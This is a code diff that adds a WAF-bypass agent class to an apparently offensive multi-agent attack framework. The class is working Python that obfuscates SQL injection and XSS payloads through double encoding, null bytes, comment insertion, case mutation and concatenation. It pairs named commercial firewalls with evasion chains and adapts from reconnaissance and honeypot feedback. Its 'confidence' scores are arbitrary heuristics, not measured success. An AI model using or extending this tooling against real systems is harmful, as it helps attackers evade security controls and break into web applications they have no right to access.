@@ -504,3 +504,502 @@ class Agent_Mutator(BaseExpert):
             stats['error'] = str(e)
 
         return stats
+
+
+class Agent_WAFBypass(BaseExpert):
+    """
+    Expert: Advanced Adversarial WAF Bypass Agent
+
+    Sophisticated Web Application Firewall evasion engine that combines:
+    - Rule pattern analysis and signature detection
+    - Multi-encoding transformation chains
+    - Adaptive mutation based on WAF response patterns
+    - Intelligence-driven evasion technique selection
+    - Real-time learning from blocked/allowed payloads
+
+    This agent significantly increases payload efficiency and power by:
+    1. Analyzing WAF rules to identify weak points
+    2. Applying contextual encoding/obfuscation
+    3. Testing payloads and adapting strategies
+    4. Sharing successful evasion patterns with swarm intelligence
+    """
+
+    def __init__(self, observation_dim: int, action_dim: int, hidden_dim: int = 128):
+        super().__init__(observation_dim, action_dim, name="WAFBypass", hidden_dim=hidden_dim)
+
+        # Multi-layer encoder for WAF pattern analysis
+        self.pattern_encoder = torch.nn.Sequential(
+            torch.nn.Linear(observation_dim, hidden_dim * 2),
+            torch.nn.LayerNorm(hidden_dim * 2),
+            torch.nn.ReLU(),
+            torch.nn.Dropout(0.2),
+            torch.nn.Linear(hidden_dim * 2, hidden_dim),
+            torch.nn.LayerNorm(hidden_dim),
+            torch.nn.ReLU()
+        )
+
+        # Evasion technique selector (multi-head attention)
+        self.technique_selector = torch.nn.MultiheadAttention(
+            embed_dim=hidden_dim,
+            num_heads=4,
+            dropout=0.1,
+            batch_first=True
+        )
+
+        # Transformation chain generator
+        self.chain_generator = torch.nn.Sequential(
+            torch.nn.Linear(hidden_dim, hidden_dim * 2),
+            torch.nn.ReLU(),
+            torch.nn.Dropout(0.2),
+            torch.nn.Linear(hidden_dim * 2, action_dim)
+        )
+
+        # Intelligence accumulator for learning
+        self.evasion_memory = []
+        self.max_memory_size = 1000
+        self.success_patterns = {}
+
+        # WAF rule pattern database (learned dynamically)
+        self.waf_signatures = {
+            'sql_injection': [],
+            'xss': [],
+            'command_injection': [],
+            'path_traversal': [],
+            'generic_attack': []
+        }
+
+    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
+                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
+        """
+        Forward pass that generates WAF bypass transformations.
+
+        Args:
+            x: Input payload representation
+            context: Optional WAF rule patterns or response data
+            mask: Optional attention mask
+
+        Returns:
+            Transformed payload representation with evasion applied
+        """
+        batch_size = x.size(0)
+
+        # 1. Encode input payload and analyze patterns
+        encoded = self.pattern_encoder(x)
+
+        # 2. If context (WAF rules) provided, use attention to focus on vulnerable patterns
+        if context is not None and context.dim() >= 2:
+            # Ensure context is 3D for attention
+            if context.dim() == 2:
+                context = context.unsqueeze(1)
+
+            # Ensure encoded is 3D
+            if encoded.dim() == 2:
+                encoded = encoded.unsqueeze(1)
+
+            # Apply multi-head attention
+            attended, attention_weights = self.technique_selector(
+                query=encoded,
+                key=context,
+                value=context,
+                need_weights=True
+            )
+
+            # Combine attended features
+            combined = encoded + attended
+            combined = combined.squeeze(1) if combined.dim() == 3 else combined
+        else:
+            combined = encoded
+
+        # 3. Generate transformation chain
+        output = self.chain_generator(combined)
+
+        return output
+
+    def apply_waf_bypass(self, payload: str, waf_type: str = 'generic',
+                        intelligence_feedback: Optional[dict] = None,
+                        recon_data: Optional[dict] = None,
+                        honeypot_learnings: Optional[dict] = None) -> dict:
+        """
+        Apply intelligent WAF bypass techniques to a payload.
+
+        SYNERGISTIC INTEGRATION:
+        - Uses recon_data to identify WAF type and rules
+        - Leverages honeypot_learnings about defender patterns
+        - Adapts based on intelligence_feedback from previous attempts
+
+        Args:
+            payload: Original payload string
+            waf_type: Type of WAF ('modsecurity', 'cloudflare', 'akamai', 'aws', 'generic')
+            intelligence_feedback: Optional feedback from previous attempts
+            recon_data: Optional reconnaissance intelligence (WAF fingerprinting)
+            honeypot_learnings: Optional honeypot interaction patterns
+
+        Returns:
+            Dictionary with transformed payloads and metadata
+        """
+        self.logger.info(f"Applying WAF bypass for {waf_type} WAF (synergistic mode)")
+
+        # SYNERGY 1: Use recon data to refine WAF type detection
+        if recon_data and 'detected_waf' in recon_data:
+            detected_waf = recon_data['detected_waf']
+            confidence = recon_data.get('confidence', 0.5)
+            if confidence > 0.7:
+                self.logger.info(f"Recon intelligence override: {waf_type} -> {detected_waf}")
+                waf_type = detected_waf
+
+        # SYNERGY 2: Incorporate honeypot learnings about defender behavior
+        enhanced_feedback = intelligence_feedback or {}
+        if honeypot_learnings and 'defender_patterns' in honeypot_learnings:
+            enhanced_feedback['defender_response_time'] = honeypot_learnings.get('avg_response_time', 1.0)
+            enhanced_feedback['detected_techniques'] = honeypot_learnings.get('blocked_patterns', [])
+            self.logger.info(f"Applied {len(enhanced_feedback.get('detected_techniques', []))} honeypot learnings")
+
+        # Apply technique chain based on WAF type and SYNERGISTIC intelligence
+        techniques = self._select_techniques(waf_type, enhanced_feedback)
+
+        transformed_variants = []
+        for technique_chain in techniques:
+            variant = payload
+            for technique in technique_chain:
+                variant = self._apply_technique(variant, technique)
+
+            # SYNERGY 3: Calculate confidence using all intelligence sources
+            confidence = self._calculate_evasion_confidence(
+                technique_chain, waf_type,
+                recon_confidence=recon_data.get('confidence', 0.5) if recon_data else 0.5,
+                honeypot_confidence=honeypot_learnings.get('pattern_confidence', 0.5) if honeypot_learnings else 0.5
+            )
+
+            transformed_variants.append({
+                'payload': variant,
+                'techniques': technique_chain,
+                'confidence': confidence,
+                'synergy_boosted': recon_data is not None or honeypot_learnings is not None
+            })
+
+        # Sort by confidence
+        transformed_variants.sort(key=lambda x: x['confidence'], reverse=True)
+
+        # Store in memory for learning (FEEDS BACK TO INTELLIGENCE HUB)
+        self._update_evasion_memory(payload, transformed_variants, enhanced_feedback)
+
+        return {
+            'original': payload,
+            'variants': transformed_variants,
+            'waf_type': waf_type,
+            'intelligence_used': enhanced_feedback != {},
+            'recon_integrated': recon_data is not None,
+            'honeypot_integrated': honeypot_learnings is not None,
+            'synergy_level': self._calculate_synergy_level(recon_data, honeypot_learnings, enhanced_feedback)
+        }
+
+    def _select_techniques(self, waf_type: str, feedback: Optional[dict]) -> list:
+        """
+        Select optimal evasion techniques based on WAF type and intelligence.
+
+        Returns:
+            List of technique chains (each chain is a list of techniques)
+        """
+        # Base technique chains for different WAF types
+        technique_db = {
+            'modsecurity': [
+                ['double_encoding', 'case_variation', 'comment_insertion'],
+                ['unicode_encoding', 'null_byte_injection'],
+                ['mixed_case', 'whitespace_mutation', 'encoding_bypass']
+            ],
+            'cloudflare': [
+                ['header_manipulation', 'rate_limit_evasion', 'ip_rotation'],
+                ['unicode_normalization', 'polyglot_construction'],
+                ['chunked_encoding', 'http_verb_tampering']
+            ],
+            'akamai': [
+                ['request_smuggling', 'protocol_confusion'],
+                ['cache_poisoning', 'edge_bypass'],
+                ['tls_fingerprint_randomization']
+            ],
+            'aws': [
+                ['signature_v4_manipulation', 'region_hopping'],
+                ['service_endpoint_confusion', 'parameter_pollution'],
+                ['iam_policy_exploitation']
+            ],
+            'generic': [
+                ['encoding_chain', 'obfuscation', 'fragmentation'],
+                ['case_mutation', 'delimiter_insertion'],
+                ['concatenation', 'variable_substitution']
+            ]
+        }
+
+        # Get base chains
+        base_chains = technique_db.get(waf_type, technique_db['generic'])
+
+        # If we have intelligence feedback, adapt chains
+        if feedback and 'blocked_techniques' in feedback:
+            blocked = set(feedback['blocked_techniques'])
+            # Filter out recently blocked techniques
+            adapted_chains = []
+            for chain in base_chains:
+                filtered_chain = [t for t in chain if t not in blocked]
+                if filtered_chain:  # Only add if chain has techniques left
+                    adapted_chains.append(filtered_chain)
+
+            if adapted_chains:
+                return adapted_chains
+
+        return base_chains
+
+    def _apply_technique(self, payload: str, technique: str) -> str:
+        """
+        Apply a specific evasion technique to the payload.
+
+        Args:
+            payload: Input payload
+            technique: Technique name
+
+        Returns:
+            Transformed payload
+        """
+        try:
+            if technique == 'double_encoding':
+                return self._double_url_encode(payload)
+            elif technique == 'unicode_encoding':
+                return self._unicode_encode(payload)
+            elif technique == 'case_variation':
+                return self._case_variation(payload)
+            elif technique == 'comment_insertion':
+                return self._insert_comments(payload)
+            elif technique == 'null_byte_injection':
+                return self._inject_null_bytes(payload)
+            elif technique == 'whitespace_mutation':
+                return self._mutate_whitespace(payload)
+            elif technique == 'encoding_chain':
+                return self._encoding_chain(payload)
+            elif technique == 'obfuscation':
+                return self._obfuscate_payload(payload)
+            elif technique == 'fragmentation':
+                return self._fragment_payload(payload)
+            elif technique == 'concatenation':
+                return self._concatenate_strings(payload)
+            elif technique == 'mixed_case':
+                return self._mixed_case(payload)
+            else:
+                self.logger.warning(f"Unknown technique: {technique}")
+                return payload
+
+        except Exception as e:
+            self.logger.error(f"Technique {technique} failed: {e}")
+            return payload
+
+    def _double_url_encode(self, payload: str) -> str:
+        """Double URL encoding for WAF bypass."""
+        import urllib.parse
+        encoded = urllib.parse.quote(payload, safe='')
+        double_encoded = urllib.parse.quote(encoded, safe='')
+        return double_encoded
+
+    def _unicode_encode(self, payload: str) -> str:
+        """Convert to Unicode escape sequences."""
+        return ''.join(f'\\u{ord(c):04x}' for c in payload)
+
+    def _case_variation(self, payload: str) -> str:
+        """Randomly vary case to evade signature matching."""
+        import random
+        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
+
+    def _insert_comments(self, payload: str) -> str:
+        """Insert inline comments to break signatures."""
+        # For SQL injection
+        if 'SELECT' in payload.upper() or 'UNION' in payload.upper():
+            return payload.replace(' ', '/*comment*/  ')
+        # For XSS
+        elif '<script' in payload.lower():
+            return payload.replace('<', '<!----><')
+        return payload
+
+    def _inject_null_bytes(self, payload: str) -> str:
+        """Inject null bytes for certain WAF types."""
+        return payload.replace(' ', ' \x00')
+
+    def _mutate_whitespace(self, payload: str) -> str:
+        """Replace spaces with alternative whitespace."""
+        import random
+        ws_alternatives = [' ', '\t', '\n', '\r', '\x0b', '\x0c']
+        return ''.join(random.choice(ws_alternatives) if c == ' ' else c for c in payload)
+
+    def _encoding_chain(self, payload: str) -> str:
+        """Apply multiple encoding layers."""
+        import base64
+        # Base64 encode
+        encoded = base64.b64encode(payload.encode()).decode()
+        # Then URL encode
+        import urllib.parse
+        return urllib.parse.quote(encoded, safe='')
+
+    def _obfuscate_payload(self, payload: str) -> str:
+        """General obfuscation with character substitution."""
+        substitutions = {
+            'a': ['a', '@', '4'],
+            'e': ['e', '3'],
+            'i': ['i', '1', '!'],
+            'o': ['o', '0'],
+            's': ['s', '$', '5']
+        }
+        import random
+        result = []
+        for c in payload:
+            if c.lower() in substitutions:
+                result.append(random.choice(substitutions[c.lower()]))
+            else:
+                result.append(c)
+        return ''.join(result)
+
+    def _fragment_payload(self, payload: str) -> str:
+        """Fragment payload into chunks."""
+        if len(payload) < 4:
+            return payload
+        mid = len(payload) // 2
+        return f"({payload[:mid]})/**/+/**/{payload[mid:]}"
+
+    def _concatenate_strings(self, payload: str) -> str:
+        """Use string concatenation to evade signatures."""
+        if len(payload) < 4:
+            return payload
+        parts = [payload[i:i+3] for i in range(0, len(payload), 3)]
+        return "'+CHAR(32)+'".join(f"'{p}'" for p in parts)
+
+    def _mixed_case(self, payload: str) -> str:
+        """Alternate upper and lower case."""
+        return ''.join(c.upper() if i % 2 == 0 else c.lower()
+                      for i, c in enumerate(payload))
+
+    def _calculate_evasion_confidence(self, technique_chain: list, waf_type: str,
+                                      recon_confidence: float = 0.5,
+                                      honeypot_confidence: float = 0.5) -> float:
+        """
+        Calculate confidence score for an evasion technique chain.
+
+        SYNERGISTIC: Confidence increases when backed by recon and honeypot intelligence.
+
+        Args:
+            technique_chain: List of evasion techniques
+            waf_type: Type of WAF
+            recon_confidence: Confidence from reconnaissance data (0-1)
+            honeypot_confidence: Confidence from honeypot learnings (0-1)
+
+        Returns:
+            Confidence score between 0 and 1
+        """
+        # Base confidence
+        confidence = 0.5
+
+        # More techniques = higher confidence (up to a point)
+        technique_bonus = min(len(technique_chain) * 0.1, 0.3)
+        confidence += technique_bonus
+
+        # Check against success history
+        chain_key = tuple(technique_chain)
+        if chain_key in self.success_patterns:
+            success_rate = self.success_patterns[chain_key]
+            confidence = (confidence + success_rate) / 2
+
+        # WAF-specific adjustments
+        waf_factors = {
+            'modsecurity': 0.8,
+            'cloudflare': 0.7,
+            'akamai': 0.6,
+            'aws': 0.75,
+            'generic': 0.9
+        }
+        confidence *= waf_factors.get(waf_type, 0.7)
+
+        # SYNERGY BOOST: Intelligence from recon increases confidence
+        recon_boost = (recon_confidence - 0.5) * 0.3  # Up to +15% boost
+        confidence += recon_boost
+
+        # SYNERGY BOOST: Intelligence from honeypot increases confidence
+        honeypot_boost = (honeypot_confidence - 0.5) * 0.3  # Up to +15% boost
+        confidence += honeypot_boost
+
+        # SYNERGY MULTIPLIER: When both recon and honeypot data present, extra boost
+        if recon_confidence > 0.6 and honeypot_confidence > 0.6:
+            confidence *= 1.2  # 20% synergy multiplier
+
+        return min(confidence, 0.95)  # Cap at 95%
+
+    def _update_evasion_memory(self, original: str, variants: list,
+                               feedback: Optional[dict]):
+        """
+        Update internal memory with evasion attempt results.
+
+        Args:
+            original: Original payload
+            variants: List of generated variants
+            feedback: Optional feedback about which variants succeeded
+        """
+        # Store in memory
+        memory_entry = {
+            'original': original,
+            'variants': variants,
+            'timestamp': torch.cuda.Event() if torch.cuda.is_available() else None,
+            'feedback': feedback
+        }
+
+        self.evasion_memory.append(memory_entry)
+
+        # Limit memory size
+        if len(self.evasion_memory) > self.max_memory_size:
+            self.evasion_memory.pop(0)
+
+        # Update success patterns if feedback provided
+        if feedback and 'successful_variants' in feedback:
+            for variant_idx in feedback['successful_variants']:
+                if variant_idx < len(variants):
+                    techniques = tuple(variants[variant_idx]['techniques'])
+                    if techniques in self.success_patterns:
+                        # Update running average
+                        old_rate = self.success_patterns[techniques]
+                        self.success_patterns[techniques] = (old_rate + 1.0) / 2
+                    else:
+                        self.success_patterns[techniques] = 0.8
+
+    def get_evasion_statistics(self) -> dict:
+        """
+        Get statistics about WAF bypass attempts and success rates.
+
+        Returns:
+            Dictionary with evasion stats
+        """
+        return {
+            'memory_size': len(self.evasion_memory),
+            'learned_patterns': len(self.success_patterns),
+            'top_techniques': sorted(
+                self.success_patterns.items(),
+                key=lambda x: x[1],
+                reverse=True
+            )[:5]
+        }
+
+    def _calculate_synergy_level(self, recon_data: Optional[dict],
+                                 honeypot_learnings: Optional[dict],
+                                 intelligence_feedback: dict) -> str:
+        """
+        Calculate the level of synergy between intelligence sources.
+
+        Returns:
+            Synergy level: 'none', 'low', 'medium', 'high', 'maximum'
+        """
+        sources = 0
+        if recon_data and 'detected_waf' in recon_data:
+            sources += 1
+        if honeypot_learnings and 'defender_patterns' in honeypot_learnings:
+            sources += 1
+        if intelligence_feedback and len(intelligence_feedback) > 0:
+            sources += 1
+
+        if sources == 0:
+            return 'none'
+        elif sources == 1:
+            return 'low'
+        elif sources == 2:
+            return 'high'
+        else:  # sources == 3
+            return 'maximum'
